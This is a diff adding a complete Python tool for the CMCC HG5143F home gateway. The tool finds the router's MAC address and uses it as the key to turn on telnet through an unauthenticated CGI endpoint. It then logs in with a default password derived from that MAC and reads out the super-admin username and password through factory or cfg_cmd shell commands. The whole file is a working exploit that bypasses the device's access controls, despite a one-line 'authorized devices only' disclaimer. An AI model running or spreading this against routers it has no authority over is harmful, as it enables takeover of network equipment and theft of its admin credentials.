@@ -1,0 +1,276 @@
+#!/usr/bin/env python3
+"""Fetch CMCC HG5143F super-admin credentials via its local telnet shell.
+
+Use only on devices you own or are authorized to administer.
+"""
+from __future__ import annotations
+
+import argparse
+import http.client
+import json
+import re
+import select
+import socket
+import subprocess
+import sys
+import time
+from dataclasses import dataclass
+
+IAC = 255
+DONT = 254
+DO = 253
+WONT = 252
+WILL = 251
+
+USERNAME_FIELD = "InternetGatewayDevice.DeviceInfo.X_CMCC_TeleComAccount.Username"
+PASSWORD_FIELD = "InternetGatewayDevice.DeviceInfo.X_CMCC_TeleComAccount.Password"
+
+
+class ProbeError(RuntimeError):
+    pass
+
+
+def normalize_mac(mac: str) -> str:
+    parts = re.findall(r"[0-9a-fA-F]+", mac)
+    if len(parts) == 6:
+        raw = "".join(part.zfill(2) for part in parts)
+    else:
+        raw = "".join(parts)
+    raw = re.sub(r"[^0-9a-fA-F]", "", raw).upper()
+    if len(raw) != 12:
+        raise ProbeError(f"invalid MAC: {mac}")
+    return raw
+
+
+@dataclass
+class Result:
+    host: str
+    login_user: str
+    login_password: str
+    username: str
+    password: str
+
+
+def sh(cmd: list[str]) -> str:
+    return subprocess.check_output(cmd, text=True, timeout=3, stderr=subprocess.DEVNULL)
+
+
+def default_gateway() -> str:
+    try:
+        out = sh(["ip", "route", "show", "default"])
+    except Exception as exc:  # noqa: BLE001
+        raise ProbeError("cannot detect default gateway; pass host manually") from exc
+    m = re.search(r"\bvia\s+(\d+\.\d+\.\d+\.\d+)\b", out)
+    if not m:
+        raise ProbeError("cannot parse default gateway; pass host manually")
+    return m.group(1)
+
+
+def gateway_mac(host: str) -> str:
+    # Ensure neighbor entry exists.
+    subprocess.run(["ping", "-c", "1", "-W", "1", host], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    for cmd in (["ip", "neigh", "show", host], ["arp", "-n", host], ["arp", "-a"]):
+        try:
+            out = sh(list(cmd))
+        except Exception:  # noqa: BLE001
+            continue
+        for line in out.splitlines():
+            if host not in line:
+                continue
+            m = re.search(r"\b([0-9a-fA-F]{1,2}(?::[0-9a-fA-F]{1,2}){5}|[0-9a-fA-F]{12})\b", line)
+            if m:
+                return normalize_mac(m.group(1))
+    raise ProbeError(f"cannot find MAC for {host}; pass --mac or --login-password manually")
+
+
+def default_login_password(mac12: str) -> str:
+    return "Fh@" + mac12[-6:]
+
+
+def enable_telnet(host: str, mac12: str, timeout: float) -> str:
+    path = f"/cgi-bin/telnetenable.cgi?telnetenable=1&key={mac12}"
+    conn = http.client.HTTPConnection(host, 80, timeout=timeout)
+    try:
+        conn.request("GET", path)
+        resp = conn.getresponse()
+        body = resp.read(4096).decode("utf-8", errors="replace")
+        return f"HTTP {resp.status} {resp.reason}: {body.strip()}"
+    finally:
+        conn.close()
+
+
+def telnet_clean(sock: socket.socket, data: bytes) -> str:
+    out = bytearray()
+    i = 0
+    while i < len(data):
+        b = data[i]
+        if b != IAC:
+            out.append(b)
+            i += 1
+            continue
+        if i + 1 >= len(data):
+            break
+        cmd = data[i + 1]
+        if cmd == IAC:
+            out.append(IAC)
+            i += 2
+            continue
+        if cmd in (DO, DONT, WILL, WONT):
+            if i + 2 >= len(data):
+                break
+            opt = data[i + 2]
+            if cmd == DO:
+                sock.sendall(bytes([IAC, WONT, opt]))
+            elif cmd == WILL:
+                sock.sendall(bytes([IAC, DONT, opt]))
+            i += 3
+            continue
+        i += 2
+    return out.decode("utf-8", errors="replace")
+
+
+def read_until(sock: socket.socket, patterns: list[str], timeout: float) -> str:
+    deadline = time.monotonic() + timeout
+    chunks: list[str] = []
+    while time.monotonic() < deadline:
+        r, _, _ = select.select([sock], [], [], min(0.2, max(0.0, deadline - time.monotonic())))
+        if not r:
+            continue
+        data = sock.recv(4096)
+        if not data:
+            break
+        chunks.append(telnet_clean(sock, data))
+        text = "".join(chunks)
+        low = text.lower()
+        if any(p.lower() in low for p in patterns):
+            return text
+    return "".join(chunks)
+
+
+def read_quiet(sock: socket.socket, timeout: float, quiet: float = 1.0) -> str:
+    deadline = time.monotonic() + timeout
+    last_data = time.monotonic()
+    chunks: list[str] = []
+    while time.monotonic() < deadline:
+        r, _, _ = select.select([sock], [], [], min(0.2, max(0.0, deadline - time.monotonic())))
+        if not r:
+            if chunks and time.monotonic() - last_data >= quiet:
+                break
+            continue
+        data = sock.recv(4096)
+        if not data:
+            break
+        chunks.append(telnet_clean(sock, data))
+        last_data = time.monotonic()
+    return "".join(chunks)
+
+
+def send_line(sock: socket.socket, line: str) -> None:
+    sock.sendall((line + "\r\n").encode())
+
+
+def run_cmd(sock: socket.socket, cmd: str, timeout: float) -> str:
+    send_line(sock, cmd)
+    return read_until(sock, ["#"], timeout)
+
+
+def parse_cfg_value(output: str, field: str) -> str:
+    matches = re.findall(r"get\s+success!value=([^\r\n]*)", output)
+    if matches:
+        return matches[-1].strip()
+    raise ProbeError(f"cannot read {field}; raw output:\n{output.strip()}")
+
+
+def parse_show_value(output: str, key: str) -> str | None:
+    m = re.search(rf"{re.escape(key)}\s*=\s*([^\r\n]+)", output)
+    return m.group(1).strip() if m else None
+
+
+def login(sock: socket.socket, user: str, password: str, timeout: float) -> str:
+    out = read_until(sock, ["login:", "username:", "#"], timeout)
+    if "#" in out and "login:" not in out.lower():
+        return out
+    if not re.search(r"login:|username:", out, re.I):
+        send_line(sock, "")
+        out += read_until(sock, ["login:", "username:", "#"], timeout)
+    if re.search(r"login:|username:", out, re.I):
+        send_line(sock, user)
+        out += read_until(sock, ["password:"], timeout)
+        send_line(sock, password)
+        out += read_until(sock, ["#", "incorrect", "failed", "login:"], timeout)
+    if "#" not in out:
+        raise ProbeError("telnet login failed; try --login-user/--login-password")
+    return out
+
+
+def fetch(host: str, port: int, timeout: float, login_user: str, login_password: str) -> Result:
+    with socket.create_connection((host, port), timeout=timeout) as sock:
+        sock.settimeout(timeout)
+        login(sock, login_user, login_password, timeout)
+        # Prefer the factory CLI path from the original tutorial; fall back to cfg_cmd.
+        factory = run_cmd(sock, "load_cli factory", timeout)
+        name_out = run_cmd(sock, "show admin_name", timeout)
+        pwd_out = run_cmd(sock, "show admin_pwd", timeout)
+        admin_name = parse_show_value(name_out, "admin_name")
+        admin_pwd = parse_show_value(pwd_out, "admin_pwd")
+        if not (admin_name and admin_pwd) or "Unknown command" in factory + name_out + pwd_out:
+            run_cmd(sock, "exit", timeout)
+            user_out = run_cmd(sock, f"cfg_cmd get {USERNAME_FIELD}", timeout)
+            pass_out = run_cmd(sock, f"cfg_cmd get {PASSWORD_FIELD}", timeout)
+            admin_name = parse_cfg_value(user_out, USERNAME_FIELD)
+            admin_pwd = parse_cfg_value(pass_out, PASSWORD_FIELD)
+        try:
+            send_line(sock, "exit")
+        except OSError:
+            pass
+    return Result(
+        host=host,
+        login_user=login_user,
+        login_password=login_password,
+        username=admin_name,
+        password=admin_pwd,
+    )
+
+
+def main(argv: list[str] | None = None) -> int:
+    p = argparse.ArgumentParser(
+        prog="hg5143f-superpass",
+        description="Read CMCC HG5143F super-admin username/password from the local telnet shell.",
+    )
+    p.add_argument("host", nargs="?", help="router IP; default: system default gateway")
+    p.add_argument("-p", "--port", type=int, default=23, help="telnet port, default: 23")
+    p.add_argument("-t", "--timeout", type=float, default=5.0, help="per-command timeout seconds, default: 5")
+    p.add_argument("--mac", help="router MAC; accepts 24:b7:da:3b:24:e0, 24-b7-da-3b-24-e0, or 24B7DA3B24E0")
+    p.add_argument("--no-enable-telnet", action="store_true", help="skip /cgi-bin/telnetenable.cgi before telnet login")
+    p.add_argument("--login-user", default="admin", help="telnet login user, default: admin")
+    p.add_argument("--login-password", help="telnet login password; default: Fh@ + gateway MAC last 6 hex")
+    p.add_argument("--json", action="store_true", help="print JSON")
+    args = p.parse_args(argv)
+
+    try:
+        host = args.host or default_gateway()
+        mac12 = normalize_mac(args.mac) if args.mac else gateway_mac(host)
+        if not args.no_enable_telnet:
+            enable_telnet(host, mac12, args.timeout)
+        login_password = args.login_password or default_login_password(mac12)
+        result = fetch(host, args.port, args.timeout, args.login_user, login_password)
+    except ProbeError as exc:
+        print(f"error: {exc}", file=sys.stderr)
+        return 2
+    except OSError as exc:
+        print(f"error: cannot connect telnet: {exc}", file=sys.stderr)
+        return 2
+
+    if args.json:
+        print(json.dumps(result.__dict__, ensure_ascii=False))
+    else:
+        print(f"host={result.host}")
+        print(f"login_user={result.login_user}")
+        print(f"login_password={result.login_password}")
+        print(f"username={result.username}")
+        print(f"password={result.password}")
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
